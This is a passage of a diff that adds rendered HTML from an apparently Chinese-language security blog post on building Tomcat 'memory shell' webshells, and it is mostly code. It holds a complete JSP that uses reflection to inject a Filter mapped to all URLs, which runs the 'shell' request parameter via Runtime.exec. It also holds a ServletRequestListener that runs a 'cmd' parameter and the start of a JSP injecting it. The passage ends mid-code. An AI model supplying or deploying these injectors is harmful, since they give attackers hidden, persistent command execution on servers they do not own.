+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Context&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Constructor&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContextFacade&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.HashMap&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//请求对象 request 中获取 ServletContext 对象。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ApplicationContextFacade 是 Spring 框架中的一个类，用于封装 Spring 的 Web 应用程序上下文。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContextFacade</span><span class="w"> </span><span class="n">applicationContextFacade</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContextFacade</span><span class="p">)</span><span class="w"> </span><span class="n">servletContext</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//通过反射获取上下文</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">applicationContextFacadeContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContextFacade</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">applicationContextFacadeContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// context 字段，即 Spring 的应用程序上下文对象。通过反射获取到该字段的值，它被强制转换为 ApplicationContext 类型</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">applicationContextFacadeContext</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContextFacade</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//从 ApplicationContext 类中获取一个名为 &#34;context&#34; 的私有字段。这个字段存储了实际的 Spring 应用程序上下文对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">applicationContextContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">applicationContextContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//类型转换standardContext，标准的web应用程序上下文</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">applicationContextContext</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//创建filterConfigs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">filterConfigs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">standardContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterConfigs</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HashMap</span><span class="p">)</span><span class="w"> </span><span class="n">filterConfigs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Filter&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hashMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">filterName</span><span class="p">)</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//构造filter对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Filter</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Filter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;shell&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;shell&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;执行过滤&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//构造filterDef对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">filterName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterClass</span><span class="p">(</span><span class="n">filter</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//将过滤器的配置信息添加到应用程序上下文中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//构造filterMap对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//添加映射的路由为所有请求</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">filterName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterMap</span><span class="p">.</span><span class="na">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="p">.</span><span class="na">REQUEST</span><span class="p">.</span><span class="na">name</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//将上述设置好的过滤器映射对象添加到 StandardContext 中，并将其插入到已有的过滤器映射之前</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//构造filterConfig</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ApplicationFilterConfig</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ApplicationFilterConfig</span><span class="w"> </span><span class="n">applicationFilterConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationFilterConfig</span><span class="p">)</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span><span class="w"> </span><span class="n">filterDef</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//将filterConfig添加到filterConfigs中，即可完成注入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">filterName</span><span class="p">,</span><span class="n">applicationFilterConfig</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;注入完成&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/10.png"
+	width="2045"
+	height="1055"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/10_hu_9489fa1560d66496.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/10_hu_769f502d9fb662cc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="465px"
+	
+></p>
+<h2 id="4listener内存马">4.Listener内存马
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/mh_ZhmcqW6rL3RgeZiDZhA"  target="_blank" rel="noopener"
+    >JAVA安全-手搓内存马系列-Listener</a></p>
+<p><strong>自己创建一个Listeren</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.listenershell</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.Servlet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.ServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.ServletRequestEvent</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.ServletRequestListener</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyListener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>在Tomcat中，</strong><code>StandardContext</code><strong>类提供了</strong><code>addApplicationListener(String listenerClassName)</code><strong>方法，可以动态添加Listener。</strong></li>
+<li><strong>如果攻击者能够访问到</strong><code>**StandardContext**</code><strong>实例（通过反序列化、反射等手段），就可以调用该方法注册恶意Listener。</strong></li>
+</ul>
+<h3 id="41注入内存马">4.1.注入内存马
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Wrapper&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;com.example.listenershell.MyListener&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span><span class="w"> </span><span class="n">pageEncoding</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="w"> </span><span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html; charset=UTF-8&#34;</span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyListener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
